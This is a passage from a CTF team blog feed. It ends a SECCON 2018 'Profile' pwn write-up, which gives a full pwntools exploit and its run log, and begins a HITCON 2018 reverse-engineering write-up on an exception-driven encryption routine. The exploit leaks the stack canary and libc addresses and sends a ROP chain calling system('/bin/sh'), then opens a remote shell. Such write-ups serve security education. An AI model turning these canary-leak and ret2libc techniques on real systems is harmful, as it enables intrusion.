class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#d = os.environ</span></span><br><span class="line">    <span class="comment">#d['LD_PRELOAD'] = './libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253'</span></span><br><span class="line">    <span class="keyword">return</span> process(filename, env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc-2.23'</span>&#125;) <span class="keyword">if</span> local <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakAddr</span><span class="params">(addr, bytes_to_read=<span class="number">6</span>)</span>:</span></span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(<span class="string">'1'</span>)</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(<span class="string">'A'</span>*<span class="number">8</span> + <span class="string">'B'</span>*<span class="number">8</span> + addr)</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(<span class="string">'2'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Name : '</span>)</span><br><span class="line">    <span class="keyword">return</span> u64(r.recv(bytes_to_read).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line">filename = <span class="string">'./profile_e814c1a78e80ed250c17e94585224b3f3be9d383'</span></span><br><span class="line">host = <span class="string">'profile.pwn.seccon.jp'</span></span><br><span class="line">port = <span class="number">28553</span></span><br><span class="line">local = <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">binary = ELF(filename)</span><br><span class="line">libc = ELF(<span class="string">'libc-2.23'</span>)</span><br><span class="line"></span><br><span class="line">POPRET = <span class="number">0x401713</span></span><br><span class="line"></span><br><span class="line">LEAKED_ADDR = <span class="number">0x0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">r = getConn()</span><br><span class="line"><span class="comment">#gdb.attach(r, '''</span></span><br><span class="line"><span class="comment">#   b *0x4011e1</span></span><br><span class="line"><span class="comment">#   b *0x4013C9</span></span><br><span class="line"><span class="comment">#   b *0x40148D</span></span><br><span class="line"><span class="comment">#   ''')</span></span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">'2'</span>*<span class="number">15</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">'3'</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">'4'</span>)</span><br><span class="line">log.info(<span class="string">'----------Searching for the offset-------------'</span>) </span><br><span class="line"><span class="keyword">while</span> LEAKED_ADDR != <span class="number">0x414141414141</span> <span class="keyword">and</span> i &lt; <span class="number">0xff</span>:</span><br><span class="line">    LEAKED_ADDR = leakAddr(p8(i))</span><br><span class="line">    log.info(<span class="string">"LEAKED ADDR 0x%x 0x%x"</span> % (LEAKED_ADDR,i))</span><br><span class="line">    i += <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> i &gt; <span class="number">0xff</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Unluckly couldn\'t find the string position'</span></span><br><span class="line">    r.close()</span><br><span class="line">    exit(<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line">LEAKED_ADDR = leakAddr(p8(i))</span><br><span class="line">log.info(<span class="string">'------------------Offset Found-----------------'</span>)</span><br><span class="line"></span><br><span class="line">CANARY_ADDR = LEAKED_ADDR+<span class="number">0x28</span></span><br><span class="line">log.info(<span class="string">"LEAKED ADDR 0x%x"</span> % LEAKED_ADDR)</span><br><span class="line">log.info(<span class="string">"CANARY ADDR 0x%x"</span> % (CANARY_ADDR))</span><br><span class="line"></span><br><span class="line">CANARY = leakAddr(p64(CANARY_ADDR) ,bytes_to_read=<span class="number">8</span>)</span><br><span class="line">log.info(<span class="string">"Canary 0x%x"</span> % CANARY)</span><br><span class="line"></span><br><span class="line">READ = leakAddr(p64(binary.got[<span class="string">'read'</span>]))</span><br><span class="line">LIBCBASE = READ - libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">SYSTEM = LIBCBASE + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">BINSH = LIBCBASE + libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line">EXIT = LIBCBASE + libc.symbols[<span class="string">'exit'</span>]</span><br><span class="line">log.info(<span class="string">"READ 0x%x"</span> % READ)</span><br><span class="line">log.info(<span class="string">"LIBC 0x%x"</span> % LIBCBASE)</span><br><span class="line">log.info(<span class="string">"SYSTEM 0x%x"</span> % SYSTEM)</span><br><span class="line">log.info(<span class="string">"BINSH 0x%x"</span> % BINSH)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">ropchain = <span class="string">''</span></span><br><span class="line">ropchain += p64(POPRET) <span class="comment"># POP RDI; RET</span></span><br><span class="line">ropchain += p64(BINSH) <span class="comment"># BINSH ADDRESS ARG[1]</span></span><br><span class="line">ropchain += p64(SYSTEM) <span class="comment"># SYSTEM function "call"</span></span><br><span class="line"></span><br><span class="line">ropchain += p64(EXIT) <span class="comment"># EXIT</span></span><br><span class="line">r.sendline(<span class="string">'1'</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(p64(<span class="number">0</span>) * <span class="number">7</span> + p64(CANARY) + p64(<span class="number">0</span>)*<span class="number">3</span> + ropchain)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">'0'</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>Running it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">$ python profile.py </span><br><span class="line">[*] <span class="string">'/ctf/work/ctf/seccon2018/pwn/profile/profile_e814c1a78e80ed250c17e94585224b3f3be9d383'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[*] <span class="string">'/ctf/work/ctf/seccon2018/pwn/profile/libc-2.23'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to profile.pwn.seccon.jp on port 28553: Done</span><br><span class="line">[*] ----------Searching <span class="keyword">for</span> the offset-------------</span><br><span class="line">[*] LEAKED ADDR 0x323232320034 0x0</span><br><span class="line">[*] LEAKED ADDR 0x7ffc15b74720 0x10</span><br><span class="line">[*] LEAKED ADDR 0x323232323232 0x20</span><br><span class="line">[*] LEAKED ADDR 0x7ffc15b74740 0x30</span><br><span class="line">[*] LEAKED ADDR 0x600034 0x40</span><br><span class="line">[*] LEAKED ADDR 0x7ffc15b74760 0x50</span><br><span class="line">[*] LEAKED ADDR 0x414141414141 0x60</span><br><span class="line">[*] ------------------Offset Found-----------------</span><br><span class="line">[*] LEAKED ADDR 0x7ffc15b74770</span><br><span class="line">[*] CANARY ADDR 0x7ffc15b74798</span><br><span class="line">[*] Canary 0x16e9ecb89abcf100</span><br><span class="line">[*] READ 0x7f2e75ce7250</span><br><span class="line">[*] LIBC 0x7f2e75bf0000</span><br><span class="line">[*] SYSTEM 0x7f2e75c35390</span><br><span class="line">[*] BINSH 0x7f2e75d7cd57</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">Wrong input...</span><br><span class="line">$ ls</span><br><span class="line">flag.txt</span><br><span class="line">profile</span><br><span class="line">$ cat flag.txt</span><br><span class="line">SECCON&#123;57r1ng_l0c4710n_15_n07_0nly_h34p&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;Profile&lt;br&gt;255&lt;br&gt;64 Solves&lt;br&gt;Host: profile.pwn.seccon.jp&lt;br&gt;Port: 28553&lt;br&gt;profile_e814c1a78e80ed250c17e94585224b3f3be9d38
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Stack Issue" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/"/>
    
      <category term="Stack Overflow" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/Stack-Overflow/"/>
    
      <category term="Canary Leak" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Stack-Issue/Canary-Leak/"/>
    
    
      <category term="stack_overflow" scheme="https://teamrocketist.github.io/tags/stack-overflow/"/>
    
      <category term="rop" scheme="https://teamrocketist.github.io/tags/rop/"/>
    
      <category term="c++" scheme="https://teamrocketist.github.io/tags/c/"/>
    
      <category term="malloc_usable_size" scheme="https://teamrocketist.github.io/tags/malloc-usable-size/"/>
    
      <category term="std::string" scheme="https://teamrocketist.github.io/tags/std-string/"/>
    
      <category term="seccon2018" scheme="https://teamrocketist.github.io/tags/seccon2018/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] Hitcon 2018 - EOP</title>
    <link href="https://teamrocketist.github.io/2018/10/22/Reverse-Hitcon-2018-EOP/"/>
    <id>https://teamrocketist.github.io/2018/10/22/Reverse-Hitcon-2018-EOP/</id>
    <published>2018-10-22T21:35:34.000Z</published>
    <updated>2018-10-24T23:59:47.485Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>EOP<br><br>EOP.<br><br>eop-811afa1b9fb0c0719a75afd316ea2c57<br>Author: david942j<br>29 Teams solved.<br><br></blockquote><p>Quite challenging reverse engineering, well at least it was for me, the binary wasn’t very hard to understand perhaps it had some strange <strong><em>exceptions</em></strong> “mechanics” which were being to used to jump to other parts of the code in a sequence order.</p><p><strong><em>Using IDA</em></strong> for this challenge was crucial for me at first I was just trying to use <strong><em>radare2</em></strong> and <strong><em>gdb</em></strong> but I got quickly overwhelmed by the code, both <strong><em>static and dynamic analysis</em></strong> were made with IDA, IDA is good because you can <strong><em>easily navigate</em></strong> through <strong><em>control flow graphs</em></strong> while debugging and it’s very easy to <strong><em>change the views</em></strong>, one thing that really helped me was to create a view to <strong><em>keep track of some global variables</em></strong> that were being used for encryption in this challenge.</p><p>You must be asking how I debugged an elf while using IDA on Windows, this can be done via remote debugging (the elf runs on an external linux machine) which is supported by IDA if you want to know how to do <a href="https://reverseengineering.stackexchange.com/questions/11516/how-to-setup-ida-pro-linux-gdb-server" target="_blank" rel="noopener">this</a>.</p><p>This binary is using <strong><em>multiple exceptions to manage the control flow</em></strong> of the program identifying this isn’t very hard after some trial and error I easily found where the exceptions were being thrown I just setted up alot of <strong><em>breakpoints</em></strong> while observing some global variables changes. The real deal in this challenge was to deal with the extensive <strong><em>encryption function</em></strong>  I ended up very tired until I <strong><em>figured out the function</em></strong>.<br> The ida <strong><em>pseudo c code converter</em></strong> wasn’t working at all so I needed to read <strong><em>pure assembly</em></strong> which isn’t a big problem for me but it <strong><em>definitively takes more time</em></strong> to read, luckily after fully <strong><em>understanding</em></strong> the encrypting function writing the code to reverse it was very easy.</p><h3 id="Identifying-the-size-of-the-flag-and-extract"><a href="#Identifying-the-size-of-the-flag-and-extract" class="headerlink" title="Identifying the size of the flag and extract"></a>Identifying the size of the flag and extract</h3><p>By opening the main function in IDA we can quickly see how much the size is the flag:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/OOwZQgz.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/OOwZQgz.png" alt=""><br></a></p><p>Scrolling down a little bit we can quickly find where the binary is checking if the flag we inserted had the correct size, The encrypted flag is already stored in a global var, we can extract it using ida, you can do this by double clicking on the offset and then <strong><em>edit -&gt; export data</em></strong> (or shift + e while selecting it ) and you can select it to export to c like I did, you then can just adapt to other languages if you are using a different language like me (in my case python).</p><p>Some Globals already showing up in the main function graph:<br><a data-fancybox="gallery" href="https://i.imgur.com/vWF5tJz.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/vWF5tJz.png" alt=""><br></a></p><p>Exporting it:<br><a data-fancybox="gallery" href="https://i.imgur.com/61Fk8YI.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/61Fk8YI.png" alt=""><br></a></p><p>Keep in mind that I renamed some functions and vars in ida so it might be a little different from yours (if you<br>want to check my idb ask it on the comments and I’ll upload it), Still looking at the main function, we can notice after the <strong><em>cmp     [rbp+var_1C], 0x2f</em></strong>, the first 16 bytes of the string are extracted to two global variables <strong><em>flaginput</em></strong> and <strong><em>flaginput2</em></strong> (renamed by me in IDA):</p><p><a data-fancybox="gallery" href="https://i.imgur.com/vnhhJdK.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/vnhhJdK.png" alt=""><br></a></p><p>As you notice from the image above after the split it’s going to call Alloc_throw_catch (renamed) this is where all the exception magic is going to happen:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/nx8Eoxl.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/nx8Eoxl.png" alt=""><br></a></p><p>Keep in mind that <strong><em>begin_catch</em></strong> actually updates the value on the heap before we jump in <strong><em>CALL RAX</em></strong> so I assumed that begin does something besides limiting the limits of the catch. Putting a break on <strong><em>CALL RAX</em></strong> is smart because this is going to be executed multiple times and it’s from here we are going to jump into the encryption functions.</p><h3 id="Encryption-Functions"><a href="#Encryption-Functions" class="headerlink" title="Encryption Functions"></a>Encryption Functions</h3><p>After jumping from <strong><em>CALL RAX</em></strong> we are going to jump into 1st encrytion function, the encryption process is separated in a lot of function, but they are very similar to each other some times they are even equal, the process is resumed in the box bellow:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">XorInputFlag</span><br><span class="line">|</span><br><span class="line">ReverveXoredString </span><br><span class="line">|</span><br><span class="line">Repeat 8 times</span><br><span class="line">ShrAddXor -&gt; AddAddXor -&gt; Ror -&gt; Rol -&gt; AddAddXor(Slighty different from the 1st AddAddXor)</span><br><span class="line">End Repeat</span><br><span class="line">|</span><br><span class="line">Xor</span><br><span class="line">|</span><br><span class="line">ExchangeByteOrders</span><br></pre></td></tr></table></figure><h4 id="XorInputFlag"><a href="#XorInputFlag" class="headerlink" title="XorInputFlag"></a>XorInputFlag</h4><p>It simply <strong><em>xors the first 8 bytes</em></strong> (inputflag) with key which is stored in a <strong><em>global variable</em></strong> (does the same for the next 8 too “inputflag2”), for the <strong><em>first 16 bytes</em></strong> (Round 1) the key is <strong><em>zero</em></strong> and when you xor something with a zero it <strong><em>does absolutely nothing</em></strong> the value remains the same. The xor key is zero because the globals are set to zero, for the next rounds they are going to filled.</p><p>On the image bellow I created a view (Views -&gt; Open subviews -&gt; Disassembly) so I can track all of this Globals so I know when they are going to be modified (helped me alot for debugging the entire process). </p><p>This function aplies to both inputflag and inputflag2.</p><p><a data-fancybox="gallery" href="https://i.imgur.com/UeIfanQ.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/UeIfanQ.png" alt=""><br></a></p><h4 id="ReverveXoredString"><a href="#ReverveXoredString" class="headerlink" title="ReverveXoredString"></a>ReverveXoredString</h4><p>Receives a string of 8 bytes ()</p><p>This function <strong><em>reverses</em></strong> the 1st 4 bytes of the string (returned from <strong><em>XorInputFlag</em></strong>) and then uses <strong><em>xor</em></strong> with a key stored in a global which IDA names it <strong><em>off_5604E325B150</em></strong> (the last numbers should differ because <a href="https://en.wikipedia.org/wiki/Position-independent_code" target="_blank" rel="noopener">PIE</a> is enabled), once again you can export it to later use it for reversing, this variable is a huge table with multiple values and is <strong><em>constantly used by the binary</em></strong>. The process is repeated again for the last 4 bytes but with a different offset from the xor key table.</p><p> if you are confused with all the shift lefts in assembly don’t be the shifts are only used to <strong><em>change the order</em></strong> of the bytes of the input for example:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String -&gt; &apos;AA&apos;</span><br><span class="line">String in hex -&gt; 0x4141</span><br><span class="line">Shift left on &apos;AA&apos; -&gt; 0x414100</span><br><span class="line">and now a simple OR operation can be used to insert a character in the beginning of the string:</span><br><span class="line">0x414100 | 0x45 =  0x414145 -&gt; &apos;EAA&apos;</span><br></pre></td></tr></table></figure><p>The first 4 bytes of string returned from <strong><em>XorInputFlag</em></strong>:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/V1sd4Lf.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/V1sd4Lf.png" alt=""><br></a></p><p>The last 4 bytes of string returned <strong><em>XorInputFlag</em></strong>:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/Knn9CcY.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Knn9CcY.png" alt=""><br></a></p><p>Resuming it the the result of the first bytes are saved on <strong><em>dword_560CC63C71C0</em></strong> and the last ones are saved on <strong><em>dword_560CC63C71C4</em></strong>.</p><h4 id="ShrAddXor-gt-AddAddXor-gt-Ror-gt-Rol-gt-AddAddXor-Slighty-diferent-from-the-1st-AddAddXor"><a href="#ShrAddXor-gt-AddAddXor-gt-Ror-gt-Rol-gt-AddAddXor-Slighty-diferent-from-the-1st-AddAddXor" class="headerlink" title="ShrAddXor -&gt; AddAddXor -&gt; Ror -&gt; Rol -&gt; AddAddXor(Slighty diferent from the 1st AddAddXor)"></a>ShrAddXor -&gt; AddAddXor -&gt; Ror -&gt; Rol -&gt; AddAddXor(Slighty diferent from the 1st AddAddXor)</h4><p>This process is going to be repeated 8 times! And they only difference on each interaction is the offsets to the xor key table is increases 0x10.</p><h5 id="ShrAddXor"><a href="#ShrAddXor" class="headerlink" title="ShrAddXor"></a>ShrAddXor</h5><p>This function does a bunch of operations to calculate the index of <strong><em>4 xor keys</em></strong> from the global array, it then applies 3 sequential xors as explained bellow, the result is saved in a new variable <strong><em>dword_560CC63C71D0</em></strong> .</p><p>The Function Applied to the first 4 bytes (Value coming from <strong><em>dword_5604E325B1C0</em></strong>)</p><p><a data-fancybox="gallery" href="https://i.imgur.com/kffFGvA.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/kffFGvA.png" alt=""><br></a></p><p>The function applied to the last 4 bytes are coming from the global <strong><em>dword_5604E325B1C4</em></strong> and is going to be stored on <strong><em>dword_560CC63C71D4</em></strong> the is the same but the order of the bytes extracted are different in this case the is<br><strong><em>4th byte, 1st byte, 2nd byte, 3rd byte</em></strong> and the final result is in a new variable <strong><em>dword_560CC63C71D4</em></strong> .</p><p>The Function applied to the last 4 bytes (Value coming from <strong><em>dword_5604E325B1C4</em></strong>)</p><p><a data-fancybox="gallery" href="https://i.imgur.com/Uvfkv1l.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Uvfkv1l.png" alt=""><br></a></p><h4 id="AddAddXor"><a href="#AddAddXor" class="headerlink" title="AddAddXor"></a>AddAddXor</h4><p>This one is really simple but they differ from interaction to interaction regarding to the offsets, and as I said above the process is going to be repeated 8 times and the offset increases <strong><em>0x10</em></strong> on each operation as explained in the image bellow for the first 4 bytes:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/r9W00O4.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/r9W00O4.png" alt=""><br></a></p><h4 id="Ror"><a href="#Ror" class="headerlink" title="Ror"></a>Ror</h4><p>This one is even simpler i just uses <strong><em>ror</em></strong> operation:</p><p>the 4 bytes are extracted from <strong><em>dword_5604E325B1C0</em></strong> and then saved to <strong><em>dword_5604E325B1C0</em></strong> again.</p><p><a data-fancybox="gallery" href="https://i.imgur.com/BkcTEqI.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/BkcTEqI.png" alt=""><br></a></p><h4 id="Rol"><a href="#Rol" class="headerlink" title="Rol"></a>Rol</h4><p>This one is simple too it just uses <strong><em>rol</em></strong> operation:</p><p>the 4 bytes are extracted from <strong><em>dword_5604E325B1C4</em></strong> and then saved to <strong><em>dword_5604E325B1C4</em></strong> again.</p><p><a data-fancybox="gallery" href="https://i.imgur.com/5vmvJRE.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/5vmvJRE.png" alt=""><br></a></p><h3 id="AddAddXor-1"><a href="#AddAddXor-1" class="headerlink" title="AddAddXor"></a>AddAddXor</h3><p>Almost the same as the previous AddAddXor but this one has this tricky operation <strong><em> lea edx, [rax + rax]</em></strong> which is equivalent to:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edx = (rax + rax) &amp; <span class="number">0xffffffff</span></span><br></pre></td></tr></table></figure></p><p>The mask (0xffffffff) must be applied because edx is a 32 bit register, this is a little thing you need to keep in mind while writing the reverse script. The index offset to each iteration will also change here (increasing 0x10 as I mention before). The results of this function are saved in <strong><em>dword_560CC63C71C4</em></strong></p><p><a data-fancybox="gallery" href="https://i.imgur.com/3bL3Fyf.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/3bL3Fyf.png" alt=""><br></a></p><p>The examples given above are related to the second chunk of 8 bytes.<br>Now for the 1st chunk of 8 bytes will run this same functions with only some differences in the offsets and the values will be saved in different globals <strong><em>dword_560CC63C71C8</em></strong>, <strong><em>dword_560CC63C71CC</em></strong>, <strong><em>dword_560CC63C71D8</em></strong> and <strong><em>dword_560CC63C71DC</em></strong>.</p><h3 id="Xor-amp-ExchangeByteOrders"><a href="#Xor-amp-ExchangeByteOrders" class="headerlink" title="Xor &amp; ExchangeByteOrders"></a>Xor &amp; ExchangeByteOrders</h3><p>Xor just xors the bytes by a key coming from the xor offset table the offsets are always the same (0x10,0x14,0x18,0x1c) for the 3 rounds after the xors and the result is stored in a new global <strong><em>dword_560CC63C71B0</em></strong>, <strong><em>ExchangeByteOrders</em></strong> will once again exchange bytes do some summations and the result is stored in a new global <strong><em>dword_560CC63C71B8</em></strong>. Bellow is the code equivalent to the assembly that comes after, since I’m running out of time I’ll post the python code now and then later I’ll post the assembly.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># Xor</span></span><br><span class="line">dword_560CC63C71C8 = dword_560CC63C71C8 ^ access_offstream(off_560CC63C7150, <span class="number">0x10</span>)</span><br><span class="line">dword_560CC63C71CC = dword_560CC63C71CC ^ access_offstream(off_560CC63C7150, <span class="number">0x14</span>)</span><br><span class="line">dword_560CC63C71C0 = dword_560CC63C71C0 ^ access_offstream(off_560CC63C7150, <span class="number">0x18</span>)</span><br><span class="line">dword_560CC63C71C4 = dword_560CC63C71C4 ^ access_offstream(off_560CC63C7150, <span class="number">0x1c</span>)</span><br><span class="line">dword_560CC63C71B0 = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># ExchangeByteOrders</span></span><br><span class="line"><span class="keyword">for</span> dword <span class="keyword">in</span> [dword_560CC63C71C8, dword_560CC63C71CC]:</span><br><span class="line">  dword_560CC63C71B0 = [dword &amp; <span class="number">0xff</span>] +dword_560CC63C71B0</span><br><span class="line">  eax = dword &gt;&gt; <span class="number">8</span></span><br><span class="line">  dword_560CC63C71B0 = [eax &amp; <span class="number">0xff</span>] +dword_560CC63C71B0</span><br><span class="line">  eax = dword &gt;&gt; <span class="number">0x10</span></span><br><span class="line">  dword_560CC63C71B0 = [eax &amp; <span class="number">0xff</span>] +dword_560CC63C71B0</span><br><span class="line">  eax = dword &gt;&gt; <span class="number">0x18</span></span><br><span class="line">  dword_560CC63C71B0 = [eax &amp; <span class="number">0xff</span>] +dword_560CC63C71B0</span><br><span class="line"></span><br><span class="line">dword_560CC63C71B8 = []</span><br><span class="line"><span class="keyword">for</span> dword <span class="keyword">in</span> [dword_560CC63C71C0, dword_560CC63C71C4]:</span><br><span class="line">  dword_560CC63C71B8 = [dword &amp; <span class="number">0xff</span>] +dword_560CC63C71B8</span><br><span class="line">  eax = dword &gt;&gt; <span class="number">8</span></span><br><span class="line">  dword_560CC63C71B8 = [eax &amp; <span class="number">0xff</span>] +dword_560CC63C71B8</span><br><span class="line">  eax = dword &gt;&gt; <span class="number">0x10</span></span><br><span class="line">  dword_560CC63C71B8 = [eax &amp; <span class="number">0xff</span>] +dword_560CC63C71B8</span><br><span class="line">  eax = dword &gt;&gt; <span class="number">0x18</span></span><br><span class="line">  dword_560CC63C71B8 = [eax &amp; <span class="number">0xff</span>] +dword_560CC63C71B8</span><br></pre></td></tr></table></figure><h3 id="Joining-dword-560CC63C71B0-and-dword-560CC63C71B8"><a href="#Joining-dword-560CC63C71B0-and-dword-560CC63C71B8" class="headerlink" title="Joining dword_560CC63C71B0 and dword_560CC63C71B8"></a>Joining dword_560CC63C71B0 and dword_560CC63C71B8</h3><p>In the end of every encryption we end up returning to the main function and the globals <strong><em>dword_560CC63C71B0</em></strong> and  <strong><em>dword_560CC63C71B8</em></strong> are stored next to each other in the <strong><em>memory</em></strong> which will be used to compare to the other encrypted flag. This is just for the <strong><em>first chunk</em></strong> of 16 bytes this, there is more 2 rounds to do for the rest of the characters but luckily they just <strong><em>repeat</em></strong> the same before the only thing that changes is on the first encryption function which now since the globals no longer are 0 the <strong><em>XorInputFlag</em></strong> function will make the difference.</p><p>Joinining dword_560CC63C71B0 and dword_560CC63C71B8 into memory ill be the start of encrypted string we inserted<br><a data-fancybox="gallery" href="https://i.imgur.com/Iap386z.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Iap386z.png" alt=""><br></a></p><h3 id="Writing-the-reverse-script"><a href="#Writing-the-reverse-script" class="headerlink" title="Writing the reverse script"></a>Writing the reverse script</h3><p>Write the reverse string is like writing the script from the bottom of the page to the top, it’s like rewinding a VHS tape back to the beginning of the movie, in our case we want to convert the encrypted flag value to the original flag.</p><p>I wrote my script in python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 